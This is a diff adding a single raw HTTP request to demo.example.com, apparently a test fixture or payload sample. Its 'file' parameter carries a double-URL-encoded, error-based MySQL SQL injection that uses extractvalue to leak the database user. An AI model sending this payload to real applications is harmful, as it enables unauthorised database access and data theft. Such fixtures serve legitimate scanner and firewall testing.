@@ -1,0 +1,4 @@
+GET /a?file=1%2527%2Band%2Bextractvalue%25281%252Cconcat%25280x7e%252Cuser%2528%2529%2529%2529%2523 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
